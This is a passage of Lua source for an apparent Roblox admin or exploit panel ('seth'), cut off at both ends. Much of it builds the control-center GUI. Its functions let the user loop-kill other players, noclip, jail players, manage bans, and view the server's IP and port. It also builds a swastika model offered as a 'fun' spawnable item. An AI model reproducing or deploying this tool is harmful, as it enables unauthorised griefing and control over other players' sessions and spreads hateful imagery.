		if FIND_IN_TABLE(LOOPED_H, v.Name) then
			v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
		end
		if FIND_IN_TABLE(LOOPED_K, v.Name) then
			v.Character:BreakJoints()
		end
	end
	if NOCLIP then
		if LP.Character:FindFirstChild('Humanoid') then LP.Character.Humanoid:ChangeState(11) end
	elseif JESUSFLY then
		if LP.Character:FindFirstChild('Humanoid') then LP.Character.Humanoid:ChangeState(12) end
	elseif SWIM then
		if LP.Character:FindFirstChild('Humanoid') then LP.Character.Humanoid:ChangeState(4) end
	end
end)

function ADD_COMMAND(N, D, A, F) table.insert(COMMANDS, {N = N, D = D, A = A, F = F}) end

function GET_PLAYER(NAME, SPEAKER)
	local NAME_TABLE = {}
	NAME = NAME:lower()
	if NAME == 'me' then
		table.insert(NAME_TABLE, SPEAKER.Name)
	elseif NAME == 'others' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if v.Name ~= SPEAKER.Name then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'all' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do table.insert(NAME_TABLE, v.Name) end
	elseif NAME == 'random' then
		table.insert(NAME_TABLE, _PLAYERS:GetPlayers()[math.random(1, #_PLAYERS:GetPlayers())].Name)
	elseif NAME == 'team' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if v.TeamColor == SPEAKER.TeamColor then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'nonadmins' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if not CHECK_ADMIN(v) then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'admins' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if CHECK_ADMIN(v) then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'nonfriends' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if not v:IsFriendsWith(SPEAKER.userId) then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'friends' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if v ~= SPEAKER and v:IsFriendsWith(SPEAKER.userId) then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'nonguests' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if not v.Guest then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'guests' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if v.Guest then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'nbcs' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if v.MembershipType == Enum.MembershipType.None then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'bcs' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if v.MembershipType == Enum.MembershipType.BuildersClub then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'tbcs' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if v.MembershipType == Enum.MembershipType.TurboBuildersClub then table.insert(NAME_TABLE, v.Name) end end
	elseif NAME == 'obcs' then
		for i,v in pairs(_PLAYERS:GetPlayers()) do if v.MembershipType == Enum.MembershipType.OutrageousBuildersClub then table.insert(NAME_TABLE, v.Name) end end
	else
		for i,v in pairs(_PLAYERS:GetPlayers()) do local L_NAME = v.Name:lower() local F = L_NAME:find(NAME) if F == 1 then table.insert(NAME_TABLE, v.Name) end end
	end
	return NAME_TABLE
end

local SI = 'rbxasset://textures/blackBkg_square.png'

function LOAD_DATA()
	local DATA = Instance.new('Folder')
	
	GUIS = Instance.new('Folder', DATA)
	HUMANOIDS = Instance.new('Folder', DATA)
	OTHER = Instance.new('Folder', DATA)
	
	MAIN_GUI = Instance.new('ScreenGui', GUIS)
	MAIN_GUI.Name = 'seth_main'
	NEW'TextLabel'{Name = 'main', Active = true, BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0.5, -200, 0.4, 0), Size = UDim2.new(0, 400, 0, 25), Draggable = true, Font = 'SourceSansBold', Text = ' Control Center', TextColor3 = C3(255, 255, 255), TextSize = 20, TextXAlignment = 'Left', Parent = MAIN_GUI}
		NEW'Frame'{Name = 'holder', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0, 0, 1, 0), Size = UDim2.new(1, 25, 12, 0), Parent = MAIN_GUI.main}
			local BUTTONS = Instance.new('Folder', MAIN_GUI.main.holder) BUTTONS.Name = 'buttons'
				NEW'TextButton'{Name = 'server', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0, 5, 0, 5), Size = UDim2.new(0, 100, 0, 30), ClipsDescendants = true, Font = 'SourceSansBold', Text = 'server info', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = BUTTONS}
				NEW'TextButton'{Name = 'admins', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0, 110, 0, 5), Size = UDim2.new(0, 100, 0, 30), ClipsDescendants = true, Font = 'SourceSansBold', Text = 'admins', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = BUTTONS}
				NEW'TextButton'{Name = 'bans', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0, 215, 0, 5), Size = UDim2.new(0, 100, 0, 30), ClipsDescendants = true, Font = 'SourceSansBold', Text = 'bans', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = BUTTONS}
				NEW'TextButton'{Name = 'cmds', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0, 320, 0, 5), Size = UDim2.new(0, 100, 0, 30), ClipsDescendants = true, Font = 'SourceSansBold', Text = 'commands', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = BUTTONS}
				NEW'TextButton'{Name = 'fun', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0, 50, 0, 40), Size = UDim2.new(0, 105, 0, 30), ClipsDescendants = true, Font = 'SourceSansBold', Text = 'fun', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = BUTTONS}
				NEW'TextButton'{Name = 'changelog', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0, 160, 0, 40), Size = UDim2.new(0, 105, 0, 30), ClipsDescendants = true, Font = 'SourceSansBold', Text = 'changelog', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = BUTTONS}
				NEW'TextButton'{Name = 'credits', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0, 270, 0, 40), Size = UDim2.new(0, 105, 0, 30), ClipsDescendants = true, Font = 'SourceSansBold', Text = 'credits', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = BUTTONS}
				
			local HOLDERS = Instance.new('Folder', MAIN_GUI.main.holder) HOLDERS.Name = 'holders'
				NEW'Frame'{Name = 'server', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.8, BorderSizePixel = 0, Position = UDim2.new(0, 5, 0, 85), Size = UDim2.new(1, -10, 0, 210), Parent = HOLDERS}
					NEW'TextLabel'{Name = 'fe', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 30), Font = 'SourceSansBold', Text = ' FilteringEnabled | ', TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.server}
					NEW'TextLabel'{Name = 'ip', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, 30), Size = UDim2.new(1, 0, 0, 30), Font = 'SourceSansBold', Text = ' IP Address | ', TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.server}
					NEW'TextLabel'{Name = 'port', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, 60), Size = UDim2.new(1, 0, 0, 30), Font = 'SourceSansBold', Text = ' Port | ', TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.server}
					NEW'TextLabel'{Name = 'place_id', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, 90), Size = UDim2.new(1, 0, 0, 30), Font = 'SourceSansBold', Text = ' Place ID | ', TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.server}
					NEW'TextLabel'{Name = 'players', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, 120), Size = UDim2.new(1, 0, 0, 30), Font = 'SourceSansBold', Text = ' Players | ', TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.server}
					NEW'TextLabel'{Name = 'time', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, 150), Size = UDim2.new(1, 0, 0, 30), Font = 'SourceSansBold', Text = ' Time | ', TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.server}
					NEW'TextLabel'{Name = 'gravity', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, 180), Size = UDim2.new(1, 0, 0, 30), Font = 'SourceSansBold', Text = ' Gravity | ', TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.server}
				NEW'ScrollingFrame'{Name = 'admins', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.8, BorderSizePixel = 0, Position = UDim2.new(0, 5, 0, 85), Size = UDim2.new(1, -10, 0, 210), Visible = false, CanvasSize = UDim2.new(0, 0, 0, 0), ScrollBarThickness = 5, TopImage = SI, MidImage = SI, BottomImage = SI, Parent = HOLDERS}
				NEW'ScrollingFrame'{Name = 'bans', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.8, BorderSizePixel = 0, Position = UDim2.new(0, 5, 0, 85), Size = UDim2.new(1, -10, 0, 210), Visible = false, CanvasSize = UDim2.new(0, 0, 0, 0), ScrollBarThickness = 5, TopImage = SI, MidImage = SI, BottomImage = SI, Parent = HOLDERS}
				NEW'ScrollingFrame'{Name = 'cmds', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.8, BorderSizePixel = 0, Position = UDim2.new(0, 5, 0, 115), Size = UDim2.new(1, -10, 0, 210), Visible = false, CanvasSize = UDim2.new(0, 0, 0, 0), ScrollBarThickness = 5, TopImage = SI, MidImage = SI, BottomImage = SI, Parent = HOLDERS}
				NEW'ScrollingFrame'{Name = 'fun', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.8, BorderSizePixel = 0, Position = UDim2.new(0, 5, 0, 85), Size = UDim2.new(1, -10, 0, 210), Visible = false, CanvasSize = UDim2.new(0, 0, 0, 0), ScrollBarThickness = 5, TopImage = SI, MidImage = SI, BottomImage = SI, Parent = HOLDERS}
				NEW'ScrollingFrame'{Name = 'changelog', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.8, BorderSizePixel = 0, Position = UDim2.new(0, 5, 0, 85), Size = UDim2.new(1, -10, 0, 210), Visible = false, CanvasSize = UDim2.new(0, 0, 0, 0), ScrollBarThickness = 5, TopImage = SI, MidImage = SI, BottomImage = SI, Parent = HOLDERS}
					local Y_CHANGES = 0
					for i,v in pairs(CHANGELOG) do
						NEW'TextLabel'{Name = '', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, Y_CHANGES), Size = UDim2.new(1, 0, 0, 30), Font = 'SourceSansBold', Text = v, TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.changelog}
						HOLDERS.changelog.CanvasSize = HOLDERS.changelog.CanvasSize + UDim2.new(0, 0, 0, 30)
						Y_CHANGES = Y_CHANGES + 30
					end
				NEW'Frame'{Name = 'credits', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.8, BorderSizePixel = 0, Position = UDim2.new(0, 5, 0, 85), Size = UDim2.new(1, -10, 0, 210), Visible = false, Parent = HOLDERS}
					NEW'TextLabel'{Name = 'text', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 1, BorderSizePixel = 0, Size = UDim2.new(1, 0, 1, 0), Font = 'SourceSansBold', Text = CREDITS, TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', TextYAlignment = 'Top', Parent = HOLDERS.credits}
				NEW'TextBox'{Name = 'search', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0.25, 0, 0, 85), Size = UDim2.new(0.5, 0, 0, 25), Visible = false, Font = 'SourceSansBold', Text = 'search commands', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = HOLDERS}
				
			NEW'Frame'{Name = 'line', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(0, 5, 0, 75), Size = UDim2.new(1, -10, 0, 5), Parent = MAIN_GUI.main.holder}
		NEW'TextButton'{Name = 'close', BackgroundColor3 = C3(255, 50, 50), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(1, 0, 0, 0), Size = UDim2.new(0, 25, 0, 25), Text = '', Parent = MAIN_GUI.main}
		
	CMD_BAR_H = Instance.new('ScreenGui', GUIS)
	CMD_BAR_H.Name = 'cmdbar_seth'
		NEW'TextBox'{Name = 'bar', BackgroundColor3 = C3(0, 0, 0), BackgroundTransparency = 0.5, BorderSizePixel = 0, Position = UDim2.new(0, -200, 1, -50), Size = UDim2.new(0, 225, 0, 25), Font = 'SourceSansItalic', Text = 'press ; to execute a command', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = CMD_BAR_H}
			NEW'ScrollingFrame'{Name = 'commands', BackgroundColor3 = C3(50, 50, 50), BackgroundTransparency = 0.5, BorderSizePixel = 0, Position = UDim2.new(0, 0, 1, -25), Size = UDim2.new(1, 0, 0, 0), Visible = false, CanvasSize = UDim2.new(0, 0, 0, 0), ScrollBarThickness = 6, ScrollingEnabled = true, BottomImage = SI, MidImage = SI, TopImage = SI, Parent = CMD_BAR_H.bar}
			NEW'TextLabel'{Name = 'commands_ex', BackgroundTransparency = 1, BorderSizePixel = 0, Size = UDim2.new(0, 200, 0, 20), Visible = false, Font = 'SourceSansBold', TextColor3 = C3(255, 255, 255), TextSize = 18, TextXAlignment = 'Left', Parent = CMD_BAR_H.bar}
			
	local NOTIFY_H = Instance.new('ScreenGui', GUIS)
	NOTIFY_H.Name = 'notify_seth'
		local N = Instance.new('Frame', NOTIFY_H)
		N.Name = 'notify'
		N.BackgroundColor3 = C3(0, 0, 0)
		N.BackgroundTransparency = 0.5
		N.BorderSizePixel = 0
		N.Position = UDim2.new(0, -225, 0.6, 0)
		N.Size = UDim2.new(0, 225, 0, 30)
			local BAR = Instance.new('Frame', N)
			BAR.Name = ''
			BAR.BackgroundColor3 = C3(255, 255, 255)
			BAR.BackgroundTransparency = 0.5
			BAR.BorderSizePixel = 0
			BAR.Position = UDim2.new(0, 0, 1, 0)
			BAR.Size = UDim2.new(1, 0, 0, 5)
			local TEXT = Instance.new('TextLabel', N)
			TEXT.Name = 'text'
			TEXT.BackgroundTransparency = 1
			TEXT.BorderSizePixel = 0
			TEXT.Size = UDim2.new(1, 0, 1, 0)
			TEXT.Font = 'SourceSansBold'
			TEXT.TextColor3 = C3(255, 255, 255)
			TEXT.TextSize = 18
			TEXT.TextXAlignment = 'Left'
			
	PAPER_MESH = Instance.new('BlockMesh', OTHER)
	PAPER_MESH.Scale = Vector3.new(1, 1, 0.1)
	
	JAIL = Instance.new('Model', OTHER)
	JAIL.Name = 'JAIL'
		local B = Instance.new('Part', JAIL)
		B.Name = 'BUTTOM'
		B.BrickColor = BrickColor.new('Black')
		B.Transparency = 0.5
		B.Anchored = true
		B.Locked = true
		B.Size = Vector3.new(6, 1, 6)
		B.TopSurface = 'Smooth'
		B.BottomSurface = 'Smooth'
		local M = Instance.new('Part', JAIL)
		M.Name = 'MAIN'
		M.BrickColor = BrickColor.new('Black')
		M.Transparency = 1
		M.Anchored = true
		M.CanCollide = false
		M.Locked = true
		M.Position = B.Position + Vector3.new(0, 3, 0)
		M.Size = Vector3.new(1, 1, 1)
		local P1 = Instance.new('Part', JAIL)
		P1.BrickColor = BrickColor.new('Black')
		P1.Transparency = 1
		P1.Position = B.Position + Vector3.new(0, 3.5, -2.5)
		P1.Rotation = Vector3.new(0, 90, 0)
		P1.Anchored = true
		P1.Locked = true
		P1.Size = Vector3.new(1, 6, 6)
		local P2 = Instance.new('Part', JAIL)
		P2.BrickColor = BrickColor.new('Black')
		P2.Transparency = 1
		P2.Position = B.Position + Vector3.new(-2.5, 3.5, 0)
		P2.Rotation = Vector3.new(-180, 0, -180)
		P2.Anchored = true
		P2.Locked = true
		P2.Size = Vector3.new(1, 6, 4)
		local P3 = Instance.new('Part', JAIL)
		P3.BrickColor = BrickColor.new('Black')
		P3.Transparency = 1
		P3.Position = B.Position + Vector3.new(2.5, 3.5, 0)
		P3.Rotation = Vector3.new(0, 0, 0)
		P3.Anchored = true
		P3.Locked = true
		P3.Size = Vector3.new(1, 6, 4)
		local P4 = Instance.new('Part', JAIL)
		P4.BrickColor = BrickColor.new('Black')
		P4.Transparency = 1
		P4.Position = B.Position + Vector3.new(0, 3.5, 2.5)
		P4.Rotation = Vector3.new(0, 90, 0)
		P4.Anchored = true
		P4.Locked = true
		P4.Size = Vector3.new(1, 6, 4)
		local TOP = Instance.new('Part', JAIL)
		TOP.BrickColor = BrickColor.new('Black')
		TOP.Transparency = 0.5
		TOP.Position = B.Position + Vector3.new(0, 7, 0)
		TOP.Rotation = Vector3.new(0, 0, 0)
		TOP.Anchored = true
		TOP.Locked = true
		TOP.Size = Vector3.new(6, 1, 6)
		TOP.TopSurface = 'Smooth'
		TOP.BottomSurface = 'Smooth'
		
	ROCKET = Instance.new('Part', OTHER)
	ROCKET.Name = 'rocket_seth'
	ROCKET.CanCollide = false
	ROCKET.Size = Vector3.new(2, 5, 2) 
		Instance.new('CylinderMesh', ROCKET)
		local F = Instance.new('Part', ROCKET)
		F.BrickColor = BrickColor.new('Black')
		F.CanCollide = false
		F.Size = Vector3.new(2, 0.2, 2)
			Instance.new('CylinderMesh', F)
			local PE = Instance.new('ParticleEmitter', F)
			PE.Color = ColorSequence.new(C3(236, 139, 70), C3(236, 139, 70))
			PE.Size = NumberSequence.new(0.2)
			PE.Texture = 'rbxassetid://17238048'
			PE.LockedToPart = true
			PE.Lifetime = NumberRange.new(0.2)
			PE.Rate = 50
			PE.Speed = NumberRange.new(-20)
		local TOP = Instance.new('Part', ROCKET)
		TOP.CanCollide = false
		TOP.Shape = 'Ball'
		TOP.Size = Vector3.new(2, 2, 2)
		TOP.TopSurface = 'Smooth'
		TOP.BottomSurface = 'Smooth'
		local BF = Instance.new('BodyForce', ROCKET)
		BF.Name = 'force'
		BF.Force = Vector3.new(0, 0, 0)
		local W1 = Instance.new('Weld', ROCKET)
		W1.Part0 = ROCKET
		W1.Part1 = F
		W1.C1 = CFrame.new(0, 2.6, 0)
		local W2 = Instance.new('Weld', ROCKET)
		W2.Part0 = ROCKET
		W2.Part1 = TOP
		W2.C1 = CFrame.new(0, -2.6, 0)
		
	ALIEN_H = Instance.new('Accessory', OTHER)
		local H = Instance.new('Part', ALIEN_H)
		H.Name = 'Handle'
		H.Size = Vector3.new(2, 2.4, 2)
			local HA = Instance.new('Attachment', H)
			HA.Name = 'HatAttachment'
			HA.Position = Vector3.new(0, 0.15, 0)
			local SM = Instance.new('SpecialMesh', H)
			SM.MeshId = 'rbxassetid://13827689'
			SM.MeshType = 'FileMesh'
			SM.Scale = Vector3.new(1, 1.02, 1)
			SM.TextureId = 'rbxassetid://13827796'
			
	local S = Instance.new('Model', OTHER) S.Name = 'swastika'
		NEW'Part'{BrickColor = BrickColor.new('Really red'), Material = 'Plastic', Anchored = true, CanCollide = false, Size = Vector3.new(2, 2, 2), BottomSurface = 'Smooth', TopSurface = 'Smooth', Parent = S}
		NEW'Part'{BrickColor = BrickColor.new('Really red'), Material = 'Plastic', Position = Vector3.new(0, 3, 0), Anchored = true, CanCollide = false, Size = Vector3.new(2, 4, 2), BottomSurface = 'Smooth', TopSurface = 'Smooth', Parent = S}
		NEW'Part'{BrickColor = BrickColor.new('Really red'), Material = 'Plastic', Position = Vector3.new(3, 0, 0), Anchored = true, CanCollide = false, Size = Vector3.new(4, 2, 2), BottomSurface = 'Smooth', TopSurface = 'Smooth', Parent = S}
		NEW'Part'{BrickColor = BrickColor.new('Really red'), Material = 'Plastic', Position = Vector3.new(0, -3, 0), Anchored = true, CanCollide = false, Size = Vector3.new(2, 4, 2), BottomSurface = 'Smooth', TopSurface = 'Smooth', Parent = S}
		NEW'Part'{BrickColor = BrickColor.new('Really red'), Material = 'Plastic', Position = Vector3.new(-3, 0, 0), Anchored = true, CanCollide = false, Size = Vector3.new(4, 2, 2), BottomSurface = 'Smooth', TopSurface = 'Smooth', Parent = S}
		NEW'Part'{BrickColor = BrickColor.new('Really red'), Material = 'Plastic', Position = Vector3.new(3, 4, 0), Anchored = true, CanCollide = false, Size = Vector3.new(4, 2, 2), BottomSurface = 'Smooth', TopSurface = 'Smooth', Parent = S}
		NEW'Part'{BrickColor = BrickColor.new('Really red'), Material = 'Plastic', Position = Vector3.new(4, -3, 0), Anchored = true, CanCollide = false, Size = Vector3.new(2, 4, 2), BottomSurface = 'Smooth', TopSurface = 'Smooth', Parent = S}
		NEW'Part'{BrickColor = BrickColor.new('Really red'), Material = 'Plastic', Position = Vector3.new(-3, -4, 0), Anchored = true, CanCollide = false, Size = Vector3.new(4, 2, 2), BottomSurface = 'Smooth', TopSurface = 'Smooth', Parent = S}
		NEW'Part'{BrickColor = BrickColor.new('Really red'), Material = 'Plastic', Position = Vector3.new(-4, 3, 0), Anchored = true, CanCollide = false, Size = Vector3.new(2, 4, 2), BottomSurface = 'Smooth', TopSurface = 'Smooth', Parent = S}
	
	CMD_BAR_H.Parent = _CORE
end

local RS = game:GetService('RunService').RenderStepped

function OPEN_MAIN()
	SETH_MAIN = MAIN_GUI:Clone()
	
	local BUTTONS = SETH_MAIN.main.holder.buttons
	local HOLDERS = SETH_MAIN.main.holder.holders
	
	for i,v in pairs(SETH_MAIN.main.holder.buttons:GetChildren()) do
		v.MouseButton1Down:connect(function(X, Y)
			OPEN_TAB(v.Name)
			if not v:FindFirstChild('circle') then
				local C = Instance.new('ImageLabel', v)
				C.BackgroundTransparency = 1
				C.Position = UDim2.new(0, X - 0, 0, Y - 35) - UDim2.new(0, v.AbsolutePosition.X, 0, v.AbsolutePosition.Y)
				C.Size = UDim2.new(0, 0, 0, 0)
				C.ZIndex = v.ZIndex
				C.Image = 'rbxassetid://200182847'
				C.ImageColor3 = C3(0, 100, 255)
				C.Name = 'circle'
				C:TweenSizeAndPosition(UDim2.new(0, 500, 0, 500), C.Position - UDim2.new(0, 250, 0, 250), 'Out', 'Quart', 2.5)
				for i = 0, 1, 0.03 do
					C.ImageTransparency = i
					RS:wait()
				end
				C:destroy()
			end
		end)
	end
	
	HOLDERS.server.place_id.Text = ' Place ID | ' .. game.PlaceId
	game:GetService('RunService').Stepped:connect(function()
		if SETH_MAIN:FindFirstChild('main') and HOLDERS:FindFirstChild('server') then
			if not workspace.FilteringEnabled then
				HOLDERS.server.fe.Text = ' FilteringEnabled | false'
			else
				HOLDERS.server.fe.Text = ' FilteringEnabled | true'
			end
			HOLDERS.server.ip.Text = ' IP Address | ' .. IP
			HOLDERS.server.port.Text = ' Port | ' .. PORT
			HOLDERS.server.players.Text = ' Players | ' .. _PLAYERS.NumPlayers .. '/' .. _PLAYERS.MaxPlayers
			HOLDERS.server.time.Text = ' Time | ' .. _LIGHTING.TimeOfDay
			HOLDERS.server.gravity.Text = ' Gravity | ' .. workspace.Gravity
		end
	end)
	
	function UPDATE_ADMINS()
		HOLDERS.admins:ClearAllChildren()
		HOLDERS.admins.CanvasSize = UDim2.new(0, 0, 0, 0)
		local Y_ADMINS = 5
		for i,v in pairs(ADMINS) do
			NEW'TextLabel'{Name = v, BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, Y_ADMINS), Size = UDim2.new(1, -30, 0, 25), Font = 'SourceSansBold', TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.admins}
			NEW'TextButton'{Name = 'update', BackgroundColor3 = C3(255, 50, 50), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(1, 0, 0, 0), Size = UDim2.new(0, 25, 0, 25), Text = '', Parent = HOLDERS.admins[v]}
			HOLDERS.admins[v].update.MouseButton1Down:connect(function()
				table.remove(ADMINS, i)
				UPDATE_ADMINS()
			end)
			HOLDERS.admins.CanvasSize = HOLDERS.admins.CanvasSize + UDim2.new(0, 0, 0, 30)
			Y_ADMINS = Y_ADMINS + 30
		end
		HOLDERS.admins.CanvasSize = HOLDERS.admins.CanvasSize + UDim2.new(0, 0, 0, 5)
		spawn(function()
			for i,v in pairs(HOLDERS.admins:GetChildren()) do
				v.Text = ' ' .. _PLAYERS:GetNameFromUserIdAsync(v.Name)
			end
		end)
	end
	UPDATE_ADMINS()
	
	function UPDATE_BANS()
		HOLDERS.bans:ClearAllChildren()
		HOLDERS.bans.CanvasSize = UDim2.new(0, 0, 0, 0)
		local Y_BANS = 5
		for i,v in pairs(BANS) do
			NEW'TextLabel'{Name = v, BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, Y_BANS), Size = UDim2.new(1, -30, 0, 25), Font = 'SourceSansBold', Text = '', TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.bans}
			NEW'TextButton'{Name = 'update', BackgroundColor3 = C3(255, 50, 50), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(1, 0, 0, 0), Size = UDim2.new(0, 25, 0, 25), Text = '', Parent = HOLDERS.bans[v]}
			HOLDERS.bans[v].update.MouseButton1Down:connect(function()
				table.remove(BANS, i)
				UPDATE_BANS()
			end)
			HOLDERS.bans.CanvasSize = HOLDERS.bans.CanvasSize + UDim2.new(0, 0, 0, 30)
			Y_BANS = Y_BANS + 30
		end
		HOLDERS.bans.CanvasSize = HOLDERS.bans.CanvasSize + UDim2.new(0, 0, 0, 5)
		spawn(function()
			for i,v in pairs(HOLDERS.bans:GetChildren()) do
				v.Text = ' ' .. _PLAYERS:GetNameFromUserIdAsync(v.Name)
			end
		end)
	end
	UPDATE_BANS()
	
	local function DISPLAY_CMDS()
		local Y_COMMANDS = 0
		for i,v in pairs(COMMANDS) do
			NEW'TextLabel'{Name = '', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, Y_COMMANDS), Size = UDim2.new(1, 0, 0, 25), Font = 'SourceSansBold', Text = ' ' .. v.D, TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.cmds}
			HOLDERS.cmds.CanvasSize = HOLDERS.cmds.CanvasSize + UDim2.new(0, 0, 0, 25)
			Y_COMMANDS = Y_COMMANDS + 25
		end
	end
	DISPLAY_CMDS()
	
	HOLDERS.search.Changed:connect(function()
		if SETH_MAIN:FindFirstChild('main') and SETH_MAIN.main.holder.holders:FindFirstChild('search') then
		if HOLDERS.search.Text ~= 'search commands' and HOLDERS.search.Focused then
			if HOLDERS.search.Text ~= '' then
				if not HOLDERS.search.Text:find(' ') then
					HOLDERS.cmds:ClearAllChildren()
					HOLDERS.cmds.CanvasSize = UDim2.new(0, 0, 0, 0)
					local Y_COMMANDS = 0
					for i,v in pairs(COMMANDS) do
						if v.N:find(HOLDERS.search.Text) then
							HOLDERS.cmds.CanvasSize = HOLDERS.cmds.CanvasSize + UDim2.new(0, 0, 0, 25)
							NEW'TextLabel'{Name = '', BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, Y_COMMANDS), Size = UDim2.new(1, 0, 0, 25), Font = 'SourceSansBold', Text = ' ' .. v.D, TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.cmds}
							HOLDERS.changelog.CanvasSize = HOLDERS.changelog.CanvasSize + UDim2.new(0, 0, 0, 25)
							Y_COMMANDS = Y_COMMANDS + 25
						end
					end
				end
			else
				HOLDERS.cmds:ClearAllChildren()
				HOLDERS.cmds.CanvasSize = UDim2.new(0, 0, 0, 0)
				DISPLAY_CMDS()
			end
		end
		end
	end)
	
	local FUN = {'balefire', 'swastika', 'trowel', 'path giver', 'orbital strike'}
	local Y_FUN = 5
	for i,v in pairs(FUN) do
